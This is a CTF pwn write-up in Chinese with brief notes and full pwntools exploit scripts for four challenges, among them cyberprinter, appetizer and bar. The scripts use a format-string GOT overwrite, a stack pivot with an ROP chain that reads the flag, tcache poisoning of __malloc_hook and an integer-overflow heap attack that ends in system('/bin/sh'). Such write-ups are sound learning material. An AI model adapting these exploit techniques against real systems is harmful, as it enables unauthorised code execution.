    cyberprinter

    首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got

    from pwn import *
    banary = "./cyberprinter"
    elf = ELF(banary)
    #libc = ELF("./libc.so.6")
    libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so")
    ip = '1.14.71.254'
    port = 28581
    local = 1
    if local:
        io = process(banary)
    else:
        io = remote(ip, port)

    context(log_level = 'debug', os = 'linux', arch = 'amd64')
    #context(log_level = 'debug', os = 'linux', arch = 'i386')

    def dbg():
        gdb.attach(io)
        pause()

    s = lambda data : io.send(data)
    sl = lambda data : io.sendline(data)
    sa = lambda text, data : io.sendafter(text, data)
    sla = lambda text, data : io.sendlineafter(text, data)
    r = lambda : io.recv()
    ru = lambda text : io.recvuntil(text)
    uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
    uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    iuu32 = lambda : int(io.recv(10),16)
    iuu64 = lambda : int(io.recv(12),16)
    lg = lambda addr : log.info(addr)
    ia = lambda : io.interactive()

    onegadget=0xe6aee
    ru("Your name?pls..")
    sl(b'A'*0x17)
    libcbase=uu64()-0x1edc50
    print("libcbase:"+hex(libcbase))
    onegadget=libcbase+onegadget
    abs_got=libcbase+0x1eb0a8
    payload=fmtstr_payload(8,{abs_got:onegadget})
    ru(b"But there is sth wrong in it,so you can't do sth")
    sl(payload)
    ia()

    appetizer

    首先是一个检查，结合ida和调试可以发现是Nameless和两个字节的偏移，所以是发送’AANameless’来跳过check

    之后就是一个很明显的栈迁移，但是注意不能离end开头太近，函数栈帧会因为往end里写数据而被破坏导致崩溃，所以可以使用垃圾数据把函数栈帧往下挪，使其远离end开头

    s = lambda data : io.send(data)

    uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))

    ru("Let's check your identity")
    #sl(b"sselemaN")
    s(b'AANameless')
    #sl(b'A'*2+p64(0x7373656c656d614e))
    io.recvuntil("Here you are:")
    gift=iuu64()
    print("gift:"+hex(gift))
    base=gift-0x4050
    leave_ret=0x00000000000012d8+base
    pop_rdi=base+0x00000000000014d3
    pop_rsi_r15=0x00000000000014d1+base
    puts_plt=elf.plt['puts']+base
    puts_got=elf.got['puts']+base
    read_plt=elf.plt['read']+base
    main=0x1428+base

    payload=b'\x00'*0x60+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
    ru("And pls write your own information on it")
    s(payload)
    ru("Tell me your wish:")
    payload=p64(gift+0x60-8)+p64(leave_ret)
    s(payload)
    gdb.attach(io,'b *gift')
    libcbase=uu64()-libc.sym['puts']
    open_addr=libcbase+libc.sym['open']
    pop_rsi = libcbase + 0x27529
    pop_rdx_rbx = libcbase + 0x1626d6
    write_addr=libcbase+libc.sym['write']
    read_addr=libcbase+libc.sym['read']
    puts_addr=libcbase+libc.sym['puts']

    orw=b'./flag'.ljust(8,b'\x00')+ b'\x00' * 0x70 + p64(pop_rdi) + p64(gift) + p64(pop_rsi) + p64(0) + p64(open_addr)
    orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(gift + 8) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(read_plt)
    orw+=p64(pop_rdi)+p64(1)+p64(write_addr)

    s(orw)

    bar

    一道比较简单的堆题，首先3选项可以直接泄露出libc，而且uaf,堆溢出都有

    首先泄露出libc，接着利用堆溢出构造出unsorted bin，使得堆块重叠，任意修改tcache的fd指针打malloc_hook

    from pwn import *
    banary = "./bar"
    elf = ELF(banary)
    #libc = ELF("./libc.so.6")
    libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
    ip = '1.14.71.254'
    port = 28581
    local = 1
    if local:
        io = process(banary)
    else:
        io = remote(ip, port)

    context(log_level = 'debug', os = 'linux', arch = 'amd64')
    #context(log_level = 'debug', os = 'linux', arch = 'i386')

    def dbg():
        gdb.attach(io)
        pause()

    s = lambda data : io.send(data)
    sl = lambda data : io.sendline(data)
    sa = lambda text, data : io.sendafter(text, data)
    sla = lambda text, data : io.sendlineafter(text, data)
    r = lambda : io.recv()
    ru = lambda text : io.recvuntil(text)
    uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
    uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    iuu32 = lambda : int(io.recv(10),16)
    iuu64 = lambda : int(io.recv(15),16)
    lg = lambda addr : log.info(addr)
    ia = lambda : io.interactive()

    def cmd(choice):
        sla("Your choice:",str(choice))

    def add(choice,content):
        cmd(1)
        sla("Whisky , brandy or Vodka?",str(choice))
        sla("You may want to tell sth to the waiter:",content)

    def delete(idx, size):
        cmd(2)
        sla(b'Which?', str(idx))
        sla(b'How much?', str(size))

    def leak():
        cmd(3)

    leak()
    ru("We will give everyone only one cup of icecream!")
    libcbase=iuu64()-0x1ec6a0
    onegadget=libcbase+0xe6af1
    malloc_hook=libcbase+libc.sym['__malloc_hook']
    lg=('libcbase')

    add(0,b'youlin')#0
    add(0,b'youlin')#1
    add(2,b'youlin')#2
    add(2,b'youlin')#3
    add(2,b'youlin')#4
    add(0,b'youlin')#5
    add(0,b'youlin')#6
    add(0,b'youlin')#7
    add(0,b'youlin')#8

    delete(3,0x40)
    delete(2,0x40)
    delete(0,0x100)
    add(0,b'A'*0xf8+p64(0x421))
    delete(1,0x100)

    add(1,b'youlin')
    add(0,b'A'*0x98+p64(0x51)+p64(malloc_hook-0x10))

    add(2,b'youlin')
    add(2,p64(onegadget))

    add(1,b'youlin')
    ia()

    from pwn import *
    banary = "./pwn"
    elf = ELF(banary)
    #libc = ELF("./libc.so.6")
    libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
    ip = 'node4.buuoj.cn'
    port = 29013
    local = 1
    if local:
        io = process(banary)
    else:
        io = remote(ip, port)

    context(log_level = 'debug', os = 'linux', arch = 'amd64')
    #context(log_level = 'debug', os = 'linux', arch = 'i386')

    def dbg():
        gdb.attach(io)
        pause()

    s = lambda data : io.send(data)
    sl = lambda data : io.sendline(data)
    sa = lambda text, data : io.sendafter(text, data)
    sla = lambda text, data : io.sendlineafter(text, data)
    r = lambda : io.recv()
    ru = lambda text : io.recvuntil(text)
    uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
    uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    iuu32 = lambda : int(io.recv(10),16)
    iuu64 = lambda : int(io.recv(12),16)
    lg = lambda addr : log.info(addr)
    ia = lambda : io.interactive()

    def cmd(choice):
        sla("Your choice:",str(choice))

    def add(size,content):
        cmd(1)
        sa("Note size:",str(size))
        sa("Note content:",content)

    def delete(index):
        cmd(2)
        sa("Note ID:",str(index))

    def show(index):
        cmd(3)
        sa("Note ID:",str(index))

    def exit():
        cmd(4)


    add(0x80,b'youlin')#0
    add(0x80,b'youlin')#1
    add(0x200,b'youlin')#2
    add(0x200,b'youlin')#3
    add(0x80,b'youlin')#4

    delete(0)
    payload=b'A'*0x80+p64(0)+p64(0x4B1)
    add(0x100000080,payload)# 整数溢出 0
    delete(1)

    add(0x80,b'youlin')#1
    show(2)
    ru('Note content:')
    libcbase=u64(io.recv(6).ljust(8,b'\x00'))-0x1ebbe0
    print("libcbase:"+hex(libcbase))
    system=libcbase+libc.sym['system']
    free_hook=libcbase+libc.sym['__free_hook']

    add(0x400,b'youiln')

    delete(1)
    payload=b'A'*0x80+p64(0)+p64(0x211)
    add(0x100000080,payload) # 1

    delete(3)
    delete(2)

    delete(1)
    payload=b'A'*0x80+p64(0)+p64(0x211)+p64(free_hook)
    add(0x100000080,payload)    # 1

    add(0x200,b'/bin/sh\x00')    # 2
    add(0x200,p64(system)) # 3

    delete(2)
